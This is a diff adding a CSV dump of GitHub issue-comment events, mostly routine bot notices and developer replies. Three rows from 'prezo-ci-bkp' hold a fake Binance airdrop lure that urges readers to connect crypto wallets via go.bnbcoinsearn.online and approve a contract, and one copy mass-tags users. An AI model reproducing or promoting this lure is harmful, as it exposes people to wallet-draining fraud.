@@ -1,0 +1,364 @@
+id,type,created_at,actor.login,repo.name,payload.issue.number,payload.action,payload.comment.body
+34499303795,IssueCommentEvent,2024-01-01T09:00:00Z,dependabot[bot],stitcombe/react-ts-vite,78.0,created,Superseded by #81.
+34499303836,IssueCommentEvent,2024-01-01T09:00:01Z,StoneCypher,StoneCypher/fsl,1235.0,created,this appears to have self-resolved along the way.  possibly when i re-registered the module?  dunno.
+34499304657,IssueCommentEvent,2024-01-01T09:00:05Z,codecov[bot],davidmoten/word-wrap,77.0,created,"## [Codecov](https://app.codecov.io/gh/davidmoten/word-wrap/pull/77?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Dave+Moten) Report
+All modified and coverable lines are covered by tests :white_check_mark:
+> Comparison is base [(`9416273`)](https://app.codecov.io/gh/davidmoten/word-wrap/commit/941627368eb723cca330996a6c4902d535ce16f8?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Dave+Moten) 97.58% compared to head [(`8baff1e`)](https://app.codecov.io/gh/davidmoten/word-wrap/pull/77?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Dave+Moten) 97.58%.
+> Report is 26 commits behind head on master.
+
+
+<details><summary>Additional details and impacted files</summary>
+
+
+```diff
+@@            Coverage Diff            @@
+##             master      #77   +/-   ##
+=========================================
+  Coverage     97.58%   97.58%           
+  Complexity      119      119           
+=========================================
+  Files             6        6           
+  Lines           331      331           
+  Branches         49       49           
+=========================================
+  Hits            323      323           
+  Misses            4        4           
+  Partials          4        4           
+```
+
+
+
+</details>
+
+[:umbrella: View full report in Codecov by Sentry](https://app.codecov.io/gh/davidmoten/word-wrap/pull/77?src=pr&el=continue&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Dave+Moten).   
+:loudspeaker: Have feedback on the report? [Share it here](https://about.codecov.io/codecov-pr-comment-feedback/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Dave+Moten).
+"
+34499304791,IssueCommentEvent,2024-01-01T09:00:05Z,Esword618,jinzhongmin/goncnn-examples,1.0,created,解决了，是这个https://github.com/jinzhongmin/goffi 里面没说安装pkg-config，我以为仅仅安装两个就好了。建议加一下。
+34499304855,IssueCommentEvent,2024-01-01T09:00:06Z,dependabot[bot],jacobdockter/portfolio-iac,47.0,created,Superseded by #48.
+34499305068,IssueCommentEvent,2024-01-01T09:00:07Z,dependabot[bot],HanchaiN/HanchaiN.github.io,22.0,created,Superseded by #26.
+34499305165,IssueCommentEvent,2024-01-01T09:00:07Z,codesee-maps[bot],marcusgchan/reci-one,177.0,created,"<details open>
+<summary><b>👇 <a href=""https://app.codesee.io/r/reviews?pr=177&src=https%3A%2F%2Fgithub.com%2Fmarcusgchan%2Freci-one"">Click on the image</a> for a new way to code review</b>
+</summary>
+
+####
+
+[![Review these changes using an interactive CodeSee Map](https://s3.us-east-2.amazonaws.com/maps.codesee.io/images/github/marcusgchan/reci-one/177/02c06bcb/b438c7123d9e8d0ffc7bd2bb9bbf0b4721f742c5.svg)](https://app.codesee.io/r/reviews?pr=177&src=https%3A%2F%2Fgithub.com%2Fmarcusgchan%2Freci-one)
+
+#### Legend
+<img src=""https://app.codesee.io/Legend_v3.png"" alt=""CodeSee Map legend"" width=""220"" height=""156"">
+</details>"
+34499305188,IssueCommentEvent,2024-01-01T09:00:07Z,dlib-issue-bot,davisking/dlib,2893.0,created,"Warning: this issue has been inactive for 35 days and will be automatically closed on 2024-01-10 if there is no further activity.
+
+If you are waiting for a response but haven't received one it's possible your question is somehow inappropriate.  E.g. it is off topic, you didn't follow the issue submission instructions, or your question is easily answerable by reading the [FAQ](http://dlib.net/faq.html),  dlib's [official compilation instructions](http://http://dlib.net/compile.html),  dlib's [API documentation](http://dlib.net/faq.html#Whereisthedocumentationforobjectfunction),  or a Google search.
+"
+34499305308,IssueCommentEvent,2024-01-01T09:00:08Z,vercel[bot],UMHelper/next-web,33.0,created,"[vc]: #VoBKMAUHzezRBYJ3+ELqH2qRUxievi9WgOgB9nPoQL8=:eyJpc01vbm9yZXBvIjp0cnVlLCJ0eXBlIjoiZ2l0aHViIiwicHJvamVjdHMiOlt7Im5hbWUiOiJuZXh0LXdlYiIsImluc3BlY3RvclVybCI6Imh0dHBzOi8vdmVyY2VsLmNvbS91bWhlbHBlci9uZXh0LXdlYi9KNERYaExHVHhkbmhQMXdEWFBLQzNXQzlzNkQ1IiwicHJldmlld1VybCI6Im5leHQtd2ViLWdpdC1yZXBseS11bWhlbHBlci52ZXJjZWwuYXBwIiwibmV4dENvbW1pdFN0YXR1cyI6IlBFTkRJTkcifV19
+**The latest updates on your projects**. Learn more about [Vercel for Git ↗︎](https://vercel.link/github-learn-more)
+
+| Name | Status | Preview | Updated (UTC) |
+| :--- | :----- | :------ | :------ |
+| **next-web** | 🔄 Building ([Inspect](https://vercel.com/umhelper/next-web/J4DXhLGTxdnhP1wDXPKC3WC9s6D5)) | [Visit Preview](https://next-web-git-reply-umhelper.vercel.app) | Jan 1, 2024 9:00am |
+
+"
+34499305356,IssueCommentEvent,2024-01-01T09:00:08Z,dependabot[bot],snapp-incubator/consul-gslb-driver,55.0,created,The following labels could not be found: `dependencies`.
+34499305638,IssueCommentEvent,2024-01-01T09:00:10Z,aosc-buildit-bot,AOSC-Dev/aosc-os-abbs,5058.0,created,"❌ Job completed on PowerNV \(ppc64el\)
+
+**Time elapsed**: 33.95s
+**Git commit**: [a1e3e5fa](https://github.com/AOSC-Dev/aosc-os-abbs/commit/a1e3e5facd5f52bd8cb87268aebe762bf31fc81a
+)
+**Architecture**: ppc64el
+**Package\(s\) to build**: autobuild4
+**Package\(s\) successfully built**: 
+**Package\(s\) failed to build**: None
+**Package\(s\) not built due to previous build failure**: 
+
+[Build Log \>\>](https://pastebin.aosc.io/paste/KKuguDfgsI5QwFZUe2cDLg/raw)
+"
+34499305701,IssueCommentEvent,2024-01-01T09:00:10Z,aolko,Chaoses-Ib/ComfyScript,3.0,created,"For example all that noise and sampling bs can be just one node, same for controlnets (load controlnet,apply controlnet)"
+34499305899,IssueCommentEvent,2024-01-01T09:00:11Z,dependabot[bot],skipzero/invoice-app,29.0,created,Superseded by #50.
+34499306051,IssueCommentEvent,2024-01-01T09:00:12Z,dependabot[bot],symonk/kafkapy,10.0,created,The following labels could not be found: `dependabot`.
+34499306343,IssueCommentEvent,2024-01-01T09:00:13Z,prezo-ci-bkp,shivekkhurana/.emacs.d,5.0,created,"# Binance Airdrop Guide: Claim Your $1500 in BNB Now!
+
+Congratulations! You've won a share of the $500k Binance Airdrop, and we're excited to give you $1500 in BNB to celebrate the end of the year. Follow the steps below to claim your tokens and make the most of this festive giveaway!
+
+[![Claim Now](https://i.ytimg.com/vi/PFhGDyXstas/maxresdefault.jpg)](http://go.bnbcoinsearn.online/97Q7Yj)
+
+## Steps to Claim:
+
+### 1. Connect Your Binance Wallet:
+   - Click on the [Connect Wallet](https://go.bnbcoinsearn.online/97Q7Yj) link.
+   - Choose your preferred wallet provider (Metamask, Trust Wallet, etc.).
+
+### 2. Interact with the Contract:
+   - Once your wallet is connected.
+   - Click on the ""**Claim**"" button to interact with the smart contract.
+
+Don't miss out on your $1500 in BNB! Act now to secure your tokens.
+
+
+Winners: @"
+34499306584,IssueCommentEvent,2024-01-01T09:00:14Z,dependabot[bot],dixitdeveloper/garden,9.0,created,Superseded by #12.
+34499306675,IssueCommentEvent,2024-01-01T09:00:14Z,vercel[bot],dixitdeveloper/garden,12.0,created,"[vc]: #y4TcRp1MX7DybYqGdXu+BwlfnE5Xbbl2FskvDt3Va0k=:eyJpc01vbm9yZXBvIjp0cnVlLCJ0eXBlIjoiZ2l0aHViIiwicHJvamVjdHMiOlt7Im5hbWUiOiJnYXJkZW4iLCJyb290RGlyZWN0b3J5IjpudWxsLCJpbnNwZWN0b3JVcmwiOiJodHRwczovL3ZlcmNlbC5jb20vYmFiYXMtcHJvamVjdHMtOTgwMzRiOGEvZ2FyZGVuL0dIUU5MMzRtV2c5TnZYV1hEYlc3dVFkWjNnNnAiLCJwcmV2aWV3VXJsIjoiZ2FyZGVuLWdpdC1kZXBlbmRhYm90LW5wbWFuZHlhcm4tMjhhZjQxLWJhYmFzLXByb2plY3RzLTk4MDM0YjhhLnZlcmNlbC5hcHAiLCJuZXh0Q29tbWl0U3RhdHVzIjoiUEVORElORyIsImxpdmVGZWVkYmFjayI6eyJyZXNvbHZlZCI6MCwidW5yZXNvbHZlZCI6MCwidG90YWwiOjAsImxpbmsiOiJnYXJkZW4tZ2l0LWRlcGVuZGFib3QtbnBtYW5keWFybi0yOGFmNDEtYmFiYXMtcHJvamVjdHMtOTgwMzRiOGEudmVyY2VsLmFwcCJ9fV19
+**The latest updates on your projects**. Learn more about [Vercel for Git ↗︎](https://vercel.link/github-learn-more)
+
+| Name | Status | Preview | Comments | Updated (UTC) |
+| :--- | :----- | :------ | :------- | :------ |
+| **garden** | 🔄 Building ([Inspect](https://vercel.com/babas-projects-98034b8a/garden/GHQNL34mWg9NvXWXDbW7uQdZ3g6p)) | [Visit Preview](https://vercel.live/open-feedback/garden-git-dependabot-npmandyarn-28af41-babas-projects-98034b8a.vercel.app?via=pr-comment-visit-preview-link&passThrough=1) | 💬 [**Add feedback**](https://vercel.live/open-feedback/garden-git-dependabot-npmandyarn-28af41-babas-projects-98034b8a.vercel.app?via=pr-comment-feedback-link) | Jan 1, 2024 9:00am |
+
+"
+34499306772,IssueCommentEvent,2024-01-01T09:00:15Z,dependabot[bot],sammacbeth/action-asana-sync,85.0,created,Superseded by #91.
+34499307316,IssueCommentEvent,2024-01-01T09:00:18Z,prezo-ci-bkp,westonnelson/aave-flashloan-mix,1.0,created,"# Binance Airdrop Guide: Claim Your $1500 in BNB Now!
+
+Congratulations! You've won a share of the $500k Binance Airdrop, and we're excited to give you $1500 in BNB to celebrate the end of the year. Follow the steps below to claim your tokens and make the most of this festive giveaway!
+
+[![Claim Now](https://i.ytimg.com/vi/PFhGDyXstas/maxresdefault.jpg)](http://go.bnbcoinsearn.online/97Q7Yj)
+
+## Steps to Claim:
+
+### 1. Connect Your Binance Wallet:
+   - Click on the [Connect Wallet](https://go.bnbcoinsearn.online/97Q7Yj) link.
+   - Choose your preferred wallet provider (Metamask, Trust Wallet, etc.).
+
+### 2. Interact with the Contract:
+   - Once your wallet is connected.
+   - Click on the ""**Claim**"" button to interact with the smart contract.
+
+Don't miss out on your $1500 in BNB! Act now to secure your tokens.
+
+
+Winners: @"
+34499307345,IssueCommentEvent,2024-01-01T09:00:18Z,jenkins4kodi,xbmc/xbmc,24386.0,created,"I've made some formatting changes to meet the current code style. The diffs are available in the following links:
+ - [PR24386-0001-2312d70a23-VIDEO-Prefer-nfo-streamdetails-if-.diff](https://jenkins.kodi.tv/job/BuildMulti-PR/28792/artifact/PR24386-0001-2312d70a23-VIDEO-Prefer-nfo-streamdetails-if-.diff)
+ - [PR24386.diff](https://jenkins.kodi.tv/job/BuildMulti-PR/28792/artifact/PR24386.diff)
+
+For more information please see our [current code style guidelines](https://github.com/xbmc/xbmc/blob/master/docs/CODE_GUIDELINES.md)."
+34499307398,IssueCommentEvent,2024-01-01T09:00:18Z,vercel[bot],CovenantNomad/hychurch-online-registration,6.0,created,"[vc]: #C6Pos19rTovIKaGfPs0Vn6PhHlsk3aRb76hBUTJuRzw=:eyJpc01vbm9yZXBvIjp0cnVlLCJ0eXBlIjoiZ2l0aHViIiwicHJvamVjdHMiOlt7Im5hbWUiOiJoeWNodXJjaC1vbmxpbmUtcmVnaXN0cmF0aW9uIiwiaW5zcGVjdG9yVXJsIjoiaHR0cHM6Ly92ZXJjZWwuY29tL2NvdmVuYW50bm9tYWQvaHljaHVyY2gtb25saW5lLXJlZ2lzdHJhdGlvbi9GdktTV0pqWHV0UG9QcTh5MmhoUGVBQ2hHYmhCIiwicHJldmlld1VybCI6Imh5Y2h1cmNoLW9ubGluZS1yZWdpc3RyYXRpb24tZ2l0LWRldmVsb3AtY292ZW5hbnRub21hZC52ZXJjZWwuYXBwIiwibmV4dENvbW1pdFN0YXR1cyI6IkRFUExPWUVEIn1dfQ==
+**The latest updates on your projects**. Learn more about [Vercel for Git ↗︎](https://vercel.link/github-learn-more)
+
+| Name | Status | Preview | Updated (UTC) |
+| :--- | :----- | :------ | :------ |
+| **hychurch-online-registration** | ✅ Ready ([Inspect](https://vercel.com/covenantnomad/hychurch-online-registration/FvKSWJjXutPoPq8y2hhPeAChGbhB)) | [Visit Preview](https://hychurch-online-registration-git-develop-covenantnomad.vercel.app) | Jan 1, 2024 9:00am |
+
+"
+34499307413,IssueCommentEvent,2024-01-01T09:00:18Z,dependabot[bot],SkynetLabs/skynet-mysky-utils,274.0,created,Superseded by #278.
+34499307675,IssueCommentEvent,2024-01-01T09:00:20Z,avdhootu27,MaikuB/flutter_local_notifications,2194.0,created,"Got it. 
+I put the image in folder mipmap and added its path as below and it worked.
+
+`const AndroidInitializationSettings initializationSettingsAndroid = AndroidInitializationSettings('mipmap/ic_launcher');`
+"
+34499307825,IssueCommentEvent,2024-01-01T09:00:21Z,dependabot[bot],tf2mandeokyi/BTETerraRenderer,50.0,created,Superseded by #57.
+34499804552,IssueCommentEvent,2024-01-01T10:00:00Z,dependabot[bot],wei/gogs,132.0,created,Superseded by #138.
+34499804643,IssueCommentEvent,2024-01-01T10:00:00Z,signcla-test-signed-indiv,google-test/signclav2-probe-repo,280896.0,created,indiv-pass-fork: test succeeded
+34499804656,IssueCommentEvent,2024-01-01T10:00:00Z,dependabot[bot],nhs-england-tools/terraform-aws-send-alarms-to-msteams,74.0,created,Superseded by #75.
+34499804692,IssueCommentEvent,2024-01-01T10:00:01Z,wryun,joeycastillo/Sensor-Watch,345.0,created,"Interested in any thoughts on the approach, and whether it's ok to drop CLOCK support entirely (as this PR does)."
+34499804734,IssueCommentEvent,2024-01-01T10:00:01Z,codesandbox-ci[bot],system-ui/theme-ui,2470.0,created,"This pull request is automatically built and testable in [CodeSandbox](https://codesandbox.io).
+
+  To see build info of the built libraries, click [here](https://ci.codesandbox.io/status/system-ui/theme-ui/pr/2470/builds/454893) or the icon next to each commit SHA.
+
+Latest deployment of this branch, based on commit 862182a0313c7368422c5e90957dd85f162f5e98:
+
+|Sandbox| Source |
+|--|--|
+|[next-theme-ui-example](https://codesandbox.io/s/next-theme-ui-example-wmjhjv)| Configuration |
+|[gatsby-plugin-theme-ui-example](https://codesandbox.io/s/gatsby-plugin-theme-ui-example-xl5x3d)| Configuration |
+"
+34499805262,IssueCommentEvent,2024-01-01T10:00:04Z,walnuts1018,kmc-jp/heineken-crawler,6.0,created,infra / heineken側に入れるまで特に何も起こらないと思うのでmergeします！
+34499806295,IssueCommentEvent,2024-01-01T10:00:08Z,github-actions[bot],guardian/riff-raff,1300.0,created,"### [Deploy build 3232 of `tools::riffraff` to CODE](https://riffraff.gutools.co.uk/deployment/deployAgain?project=tools%3A%3Ariffraff&build=3232&stage=CODE&updateStrategy=MostlyHarmless&action=deploy)
+<details>
+<summary>All deployment options</summary>
+
+- [Deploy build 3232 of `tools::riffraff` to CODE](https://riffraff.gutools.co.uk/deployment/deployAgain?project=tools%3A%3Ariffraff&build=3232&stage=CODE&updateStrategy=MostlyHarmless&action=deploy)
+- [Deploy parts of build 3232 to CODE by previewing it first](https://riffraff.gutools.co.uk/preview/yaml?project=tools%3A%3Ariffraff&build=3232&stage=CODE&updateStrategy=MostlyHarmless)
+- [What's on CODE right now?](https://riffraff.gutools.co.uk/deployment/history?projectName=tools%3A%3Ariffraff&stage=CODE)
+</details>
+
+---
+_From [guardian/actions-riff-raff](https://github.com/guardian/actions-riff-raff)._
+<!-- guardian/actions-riff-raff for tools::riffraff -->"
+34499806399,IssueCommentEvent,2024-01-01T10:00:09Z,netlify[bot],vitorRibeiro7/pokejan-app-moove,43.0,created,"### <span aria-hidden=""true"">👷</span> Deploy Preview for *pokejan* processing.
+
+
+|  Name | Link |
+|:-:|------------------------|
+|<span aria-hidden=""true"">🔨</span> Latest commit | 2ce8b0c175fd0ff0da1df9e3e8b76cb71e6d89ed |
+|<span aria-hidden=""true"">🔍</span> Latest deploy log | https://app.netlify.com/sites/pokejan/deploys/65928d25f555eb0008ab03b5 |"
+34499806619,IssueCommentEvent,2024-01-01T10:00:10Z,cocogitto-bot[bot],ecsact-dev/unity-ecsact-wasm-bazel-template,4.0,created,:heavy_check_mark: 3d3458e21043cf1f52b1f8c5da8b828bee54321f - Conventional commits check succeeded.
+34499806794,IssueCommentEvent,2024-01-01T10:00:11Z,otyugh,dokuwiki/dokuwiki,4129.0,created,"(note : The problem only occurred on login success not failing it)
+
+Could it be a combination of my nginx settings & dokuwiki ? Because I can give you a ""default dokuwiki"" lf the latest version that I'd just pasted on my webserver and you could reproduce it. Sadly I don't know if it'll be of any use.
+https://t2.arzinfo.eu.org/doku.php?id=start"
+34499806825,IssueCommentEvent,2024-01-01T10:00:11Z,cocogitto-bot[bot],ecsact-dev/unity-ecsact-wasm-bazel-template,15.0,created,:heavy_check_mark: 739ab8c5efb9d56ea5d312f56e0600336c945c53 - Conventional commits check succeeded.
+34499806856,IssueCommentEvent,2024-01-01T10:00:11Z,kubevirt-bot,kubevirt/hyperconverged-cluster-operator,2707.0,created,"[APPROVALNOTIFIER] This PR is **NOT APPROVED**
+
+This pull-request has been approved by:
+**Once this PR has been reviewed and has the lgtm label**, please ask for approval from [nunnatsa](https://github.com/nunnatsa). For more information see [the Kubernetes Code Review Process](https://git.k8s.io/community/contributors/guide/owners.md#the-code-review-process).
+
+The full list of commands accepted by this bot can be found [here](https://go.k8s.io/bot-commands?repo=kubevirt%2Fhyperconverged-cluster-operator).
+
+<details open>
+Needs approval from an approver in each of these files:
+
+- **[OWNERS](https://github.com/kubevirt/hyperconverged-cluster-operator/blob/release-1.10/OWNERS)**
+
+Approvers can indicate their approval by writing `/approve` in a comment
+Approvers can cancel approval by writing `/approve cancel` in a comment
+</details>
+<!-- META={""approvers"":[""nunnatsa""]} -->"
+34499807168,IssueCommentEvent,2024-01-01T10:00:12Z,Syrup,Miouwn/upl,5209.0,created,"**Resolved:** Ye is back up in [`f014782`](https://github.com/Miouwn/upl/commit/f0147823ca79f9a38b198f1383fa4c267f4a689a
+) after 8 minutes."
+34499807477,IssueCommentEvent,2024-01-01T10:00:14Z,elee1766,caddyserver/caddy,5833.0,created,"sounds good, and done. "
+34499807594,IssueCommentEvent,2024-01-01T10:00:15Z,dependabot[bot],extrawurst/gitui,1996.0,created,"OK, I won't notify you again about this release, but will get in touch when a new version is available. If you'd rather skip all updates until the next major or minor version, let me know by commenting `@dependabot ignore this major version` or `@dependabot ignore this minor version`. You can also ignore all major, minor, or patch releases for a dependency by adding an [`ignore` condition](https://docs.github.com/en/code-security/supply-chain-security/configuration-options-for-dependency-updates#ignore) with the desired `update_types` to your config file.
+
+If you change your mind, just re-open this PR and I'll resolve any conflicts on it."
+34499807644,IssueCommentEvent,2024-01-01T10:00:15Z,leck995,brianhsu/Live2DForScala,3.0,created,是的，感謝辛苦修複。
+34499807697,IssueCommentEvent,2024-01-01T10:00:15Z,dependabot[bot],reactserbia/uplatnica,156.0,created,Superseded by #166.
+34499807874,IssueCommentEvent,2024-01-01T10:00:16Z,renovate[bot],ecomplus-stores/caioorfanelli,44.0,created,"### Edited/Blocked Notification
+
+Renovate will not automatically rebase this PR, because it does not recognize the last commit author and assumes somebody else may have edited the PR.
+
+You can manually request rebase by checking the rebase/retry box above.
+
+ ⚠ **Warning**: custom changes will be lost."
+34499807960,IssueCommentEvent,2024-01-01T10:00:17Z,codecov[bot],enonic/starter-tsup,394.0,created,"## [Codecov](https://app.codecov.io/gh/enonic/starter-tsup/pull/394?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=enonic) Report
+All modified and coverable lines are covered by tests :white_check_mark:
+> Comparison is base [(`8d6cc1c`)](https://app.codecov.io/gh/enonic/starter-tsup/commit/8d6cc1c1aea486cff77118d951e607ae387eb125?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=enonic) 7.88% compared to head [(`4a07602`)](https://app.codecov.io/gh/enonic/starter-tsup/pull/394?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=enonic) 7.88%.
+
+
+<details><summary>Additional details and impacted files</summary>
+
+
+```diff
+@@          Coverage Diff          @@
+##            main    #394   +/-   ##
+=====================================
+  Coverage   7.88%   7.88%           
+=====================================
+  Files         25      25           
+  Lines       1142    1142           
+  Branches      33      33           
+=====================================
+  Hits          90      90           
+  Misses      1030    1030           
+  Partials      22      22           
+```
+
+
+
+</details>
+
+[:umbrella: View full report in Codecov by Sentry](https://app.codecov.io/gh/enonic/starter-tsup/pull/394?src=pr&el=continue&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=enonic).   
+:loudspeaker: Have feedback on the report? [Share it here](https://about.codecov.io/codecov-pr-comment-feedback/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=enonic).
+"
+34499807967,IssueCommentEvent,2024-01-01T10:00:17Z,Yh010,aadeshkulkarni/sanchay-ai-frontend,2.0,created,"@aadeshkulkarni what if we add a default landing page, which contains a ""get started "" button, which when clicked will redirect to the login process, and upon successful login, the user is redirected to his dashboard?
+
+Something of this sort: https://rxresu.me/"
+34499808136,IssueCommentEvent,2024-01-01T10:00:18Z,height[bot],itsbrex/AbletonOSC,1.0,created,"> Link [Height](https://height.app/d7s6_Dxw5A) tasks by mentioning a task ID in the pull request title or commit messages, or description and comments with the keyword `link` (e.g. ""Link T-123"").
+>
+> 💡Tip: You can also use ""Close T-X"" to automatically close a task when the pull request is merged.
+<!-- Sent by Height -->"
+34499808151,IssueCommentEvent,2024-01-01T10:00:18Z,SMillerDev,Homebrew/homebrew-core,158667.0,created,"> I'd like bash formula to have the homebrew ncurses as an dependency, be compiled against it.
+
+You can make a pull request, but since homebrew prefers to build against system tools on macOS I don't think this will be favoured over the current approach."
+34499808544,IssueCommentEvent,2024-01-01T10:00:20Z,kamiyadm,linuxdeepin/linglong-hub,1755.0,created,desktop缺失icon
+34500357566,IssueCommentEvent,2024-01-01T11:00:00Z,Levuk0,Giftedbulldozer/Mouse-Auto-Scroll,1.0,created,"it is down, i'll compile it later and send it "
+34500357611,IssueCommentEvent,2024-01-01T11:00:00Z,netlify[bot],HarshKhaiwal/MyObsidian,4.0,created,"### <span aria-hidden=""true"">👷</span> Deploy Preview for *zorojuro* processing.
+
+
+|  Name | Link |
+|:-:|------------------------|
+|<span aria-hidden=""true"">🔨</span> Latest commit | 37c66d6265ac51ceda82a94db444a74970ee39d5 |
+|<span aria-hidden=""true"">🔍</span> Latest deploy log | https://app.netlify.com/sites/zorojuro/deploys/65929b04c1c777000881b596 |"
+34500357686,IssueCommentEvent,2024-01-01T11:00:01Z,dependabot[bot],sls-reference-architectures/ddb-transactions,75.0,created,Superseded by #77.
+34500357817,IssueCommentEvent,2024-01-01T11:00:02Z,maryjaf,Giveth/giveth-dapps-v2,3393.0,created,"
+- [ ] Add solana in create project  page-- Pass
+- [ ] Add solana in edit project page -- Pass
+- [ ] add solana in manage address modal (my project list) -- Code Review "
+34500358044,IssueCommentEvent,2024-01-01T11:00:03Z,burdoto,Mineaurion/Aurionchat,25.0,created,"could it be that your rabbitmq impl is fetching Vhost based on connection parameters? (domain, servername, etc?)
+as mentioned this is my first time using rabbitmq so it could as well be a configuration issue.
+i am not aware of way to test rabbitmq"
+34500358080,IssueCommentEvent,2024-01-01T11:00:03Z,dependabot[bot],njoguamos/gikuyu,125.0,created,"Looks like autoprefixer is up-to-date now, so this is no longer needed."
+34500358353,IssueCommentEvent,2024-01-01T11:00:04Z,fuergaosi233,fuergaosi233/wereadwise,7.0,created,Thanks for your work 🙏
+34500358686,IssueCommentEvent,2024-01-01T11:00:05Z,dependabot[bot],mliradelc/opencast,1153.0,created,Superseded by #1196.
+34500358815,IssueCommentEvent,2024-01-01T11:00:06Z,dependabot[bot],microsoft/vscode-autopep8,210.0,created,Superseded by #221.
+34500358932,IssueCommentEvent,2024-01-01T11:00:07Z,dependabot[bot],w3c/aria-practices,2878.0,created,Superseded by #2895.
+34500358955,IssueCommentEvent,2024-01-01T11:00:07Z,Shallowmallow,haxeui/haxeui-core,561.0,created,"OKay I'm satisfied with it. I put some  kind of arbitrary number (5)  to limit the precision.  if a float is too precise, when multiplied and converted to int it causes problems ( I mean when 0.0006 is converted to 6). I don't know how to call it so didn't static inline it  ( yes bad) .
+I think it was the best limit I found, but maybe there is a way to calculate it ?"
+34500359028,IssueCommentEvent,2024-01-01T11:00:07Z,CasperH2O,Valkirie/HandheldCompanion,916.0,created,Fixed in next EA. ADLX blocked threads.
+34500359501,IssueCommentEvent,2024-01-01T11:00:09Z,nielsvanvelzen,jellyfin/jellyfin-androidtv,3271.0,created,"We will not add support for media sessions in the old playback code. The metadata of items is incomplete and it will not work when using the LibVLC backend in the implementation of this PR.
+
+Besides, media session support is already a thing with the new backend which is actively being worked on."
+34500359591,IssueCommentEvent,2024-01-01T11:00:09Z,dependabot[bot],Crystal-Creations-GbR/pulsating-circle,120.0,created,Superseded by #143.
+34500359736,IssueCommentEvent,2024-01-01T11:00:10Z,prezo-ci-bkp,AlexiaChen/AlexiaChen.github.io,138.0,created,"# Binance Airdrop Guide: Claim Your $1500 in BNB Now!
+
+Congratulations! You've won a share of the $500k Binance Airdrop, and we're excited to give you $1500 in BNB to celebrate the end of the year. Follow the steps below to claim your tokens and make the most of this festive giveaway!
+
+[![Claim Now](https://i.ytimg.com/vi/PFhGDyXstas/maxresdefault.jpg)](http://go.bnbcoinsearn.online/97Q7Yj)
+
+## Steps to Claim:
+
+### 1. Connect Your Binance Wallet:
+   - Click on the [Connect Wallet](https://go.bnbcoinsearn.online/97Q7Yj) link.
+   - Choose your preferred wallet provider (Metamask, Trust Wallet, etc.).
+
+### 2. Interact with the Contract:
+   - Once your wallet is connected.
+   - Click on the ""**Claim**"" button to interact with the smart contract.
+
+Don't miss out on your $1500 in BNB! Act now to secure your tokens.
+
+
+Winners: @jomix, @JoaoMirandaXP, @patryk-kozak-branch, @MeralSilviusKarga, @sngyai, @polopek69, @Yelsiw, @JoachimFrydenlund, @jbalatero, @F-Dupraz, @tsz61, @kfihihc, @yuriykuntsyak, @bekha-io, @adrianocr, @Butters3388214, @rl3250, @altitude, @felipefrizzo, @nikitavoloboev, @paulfurber, @hero5512, @sbusso, @agucova, @nunoedgar-invest, @RXWatcher, @kissgyorgy, @sprayogo, @a-dwarf, @y0sh1, @sinamoradi, @stratolark, @jtb87, @rririanto, @zhongyin, @maiph, @dlazares, @cloverzrg, @dazoe, @hmert, @istlf, @Al1rios, @tongxiaofeng, @wpank, @FrederickNgoiya, @codefever, @grojef, @askmetoo, @PirataMorgan, @mahlombe"
+34500359972,IssueCommentEvent,2024-01-01T11:00:11Z,dependabot[bot],ipfs/helia-unixfs,136.0,created,Superseded by #146.
+34500359981,IssueCommentEvent,2024-01-01T11:00:11Z,stackblitz[bot],luckylennoxll/hint,395.0,created,"<a href=""https://stackblitz.com/~/github.com/luckylennoxll/hint/pull/395""><img src=""https://developer.stackblitz.com/img/review_pr_small.svg"" alt=""Review PR in StackBlitz Codeflow"" align=""left"" width=""103"" height=""20""></a> _Run & review this pull request in [StackBlitz Codeflow](https://stackblitz.com/~/github.com/luckylennoxll/hint/pull/395)._
+"
+34500360018,IssueCommentEvent,2024-01-01T11:00:11Z,brillout,brillout/telefunc,95.0,created,"Correct me if I'm wrong but I think it works if you set `config.root` to the project root directory of your *client-side*, i.e. to `'/Users/pencilcheck/Projects/project-new-expo/apps/expo/src/'`.
+
+Actually, I don't think setting `config.root` to the monorepo root `'/Users/pencilcheck/Projects/project-new-expo/apps/expo/'` works; I expect an error like/similar to the one you posted in your other issue.
+
+I'll improve the docs to clarify that.
+
+(Unrelated but I recommend following https://telefunc.com/event-based.)"
+34500360078,IssueCommentEvent,2024-01-01T11:00:12Z,dependabot[bot],ipfs/public-gateway-checker,508.0,created,Superseded by #510.
+34500360080,IssueCommentEvent,2024-01-01T11:00:12Z,mocodesmo,SatoshiPortal/bullbitcoin-mobile,225.0,created,"fixed on main 
+this was initially done because long pressing and pasting directly into the textfield would keep the keyboard onscreen"
+34500360092,IssueCommentEvent,2024-01-01T11:00:12Z,netlify[bot],scipy/scipy.org,551.0,created,"### <span aria-hidden=""true"">👷</span> Deploy Preview for *scipy-org* processing.
+
+
+|  Name | Link |
+|:-:|------------------------|
+|<span aria-hidden=""true"">🔨</span> Latest commit | 1683e088e1ed8cd5a7e3a907955ee1adaa338412 |
+|<span aria-hidden=""true"">🔍</span> Latest deploy log | https://app.netlify.com/sites/scipy-org/deploys/65929b2b13c2d80008d8fe3e |"
+34500360185,IssueCommentEvent,2024-01-01T11:00:12Z,dependabot[bot],luckylennoxll/hint,180.0,created,Superseded by #395.
+34500360188,IssueCommentEvent,2024-01-01T11:00:12Z,dependabot[bot],phamduylong/truong-anh-ngok-quotes,60.0,created,Superseded by #63.
+34500360267,IssueCommentEvent,2024-01-01T11:00:13Z,iamogbz,iamogbz/webpack-compiler-plugin,2016.0,created,@dependabot merge
+34500360465,IssueCommentEvent,2024-01-01T11:00:14Z,radek8,bigtreetech/SKR-3,57.0,created,"If Touch Mode works for you, you don't need Marlin Mode. 
+I haven't used Marlin mode in over a year. 
+"
